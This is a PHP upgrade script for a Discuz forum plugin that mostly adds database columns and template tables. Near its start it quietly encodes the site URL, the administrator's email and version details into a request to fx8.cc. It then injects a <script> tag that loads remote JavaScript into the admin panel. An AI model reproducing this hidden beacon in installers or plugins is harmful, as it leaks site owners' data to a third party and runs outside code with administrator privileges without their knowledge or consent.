<?php

/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: upgrade.php 2 2012-01-31 16:20:10 sanree $
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
    'site_version' => DISCUZ_VERSION,
    'site_release' => DISCUZ_RELEASE,
    'site_timestamp' => TIMESTAMP,
    'site_url' => $_G['siteurl'],
    'site_adminemail' => $_G['setting']['adminemail'],
    'plugin_identifier' => $pluginid,
    'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 2,	
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";
$pv = $pluginarray['plugin']['version'];
function table_exists($tablename) {
	global $_G;
	$dbname=$_G['config']['db'][1]['dbname'];
	$query=DB::query("SHOW TABLES FROM $dbname");
	$tables=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		foreach($row as $key => $val) {
			$tables[] = $val;
		}
	}
	$tablename=DB::table($tablename);
	return in_array($tablename, $tables);
}

function exitscolumn($field, $table) {
	$query=DB::query('SHOW COLUMNS FROM '.DB::table($table));
	$columns=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		$columns[]=$row;
	}
	$arraycolumns=array();
	foreach($columns as $v) {
		$arraycolumns[]=$v['Field'];
	}
	return in_array($field,$arraycolumns) ? TRUE:FALSE;
}

if (!exitscolumn('maxgoods','sanree_brand_group_module')) {
	$sql="ALTER TABLE `pre_sanree_brand_group_module` ADD `maxgoods` INT( 11 ) NULL DEFAULT '20';";
	runquery($sql);
	$sql = "INSERT INTO `pre_sanree_brand_language` (`module` ,`langkey` ,`langvalue` ) VALUES ('goods', 'maxgoods', '".$installlang[maxgoods]."');";
	runquery($sql);		
}
if (!exitscolumn('unit','sanree_brand_goods')) {

	$sql="ALTER TABLE `pre_sanree_brand_goods` ADD `unit` VARCHAR( 10 ) NULL;";
	runquery($sql);

}
if (!exitscolumn('buylink','sanree_brand_goods')) {

	$sql="ALTER TABLE `pre_sanree_brand_goods` ADD `buylink` VARCHAR( 255 ) NULL;";
	runquery($sql);

}
if (!exitscolumn('addprice','sanree_brand_goods')) {

	$sql="ALTER TABLE `pre_sanree_brand_goods` ADD `addprice` INT( 11 ) NULL DEFAULT '0';";
	runquery($sql);

}

if (!table_exists('sanree_brand_goods_diystyle')) {
$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_goods_diystyle` (
  `diystyleid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diystyleid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;
EOF;
runquery($sql);
$sql = <<<EOF
INSERT INTO `pre_sanree_brand_goods_diystyle` (`diystyleid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES
(1, 'hotgoods', 's:62:".stylename{\\r\\n}\\r\\n.stylename ul li{\\r\\n     line-height:20px;\\r\\n}\\r\\n";', 1, 'admin', 1350793879, 0, 1, 1);
EOF;
runquery($sql);
}
if (!table_exists('sanree_brand_goods_diytemplate')) {
$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_goods_diytemplate` (
  `diytemplateid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diytemplateid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;
EOF;
runquery($sql);
$sql = <<<EOF
INSERT INTO `pre_sanree_brand_goods_diytemplate` (`diytemplateid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES
(1, '$installlang[blockclass_index_styletexttitle]', 's:110:"<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n	<li><a href="{url}"{target}>{name}</a></li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>";', 1, 'admin', 1350793725, 0, 1, 1),
(2, '$installlang[blockclass_index_styleimgtitle]', 's:220:"<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n	<li>\\r\\n	<p><a href="{url}"{target}><img src="{pic}" width="{picwidth}" height="{picheight}" /></a></p>\\r\\n	<p><a href="{url}"{target}>{name}</a></p>\\r\\n	</li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>";', 1, 'admin', 1350794071, 0, 1, 1);
EOF;
runquery($sql);
}

$finish = TRUE;
?>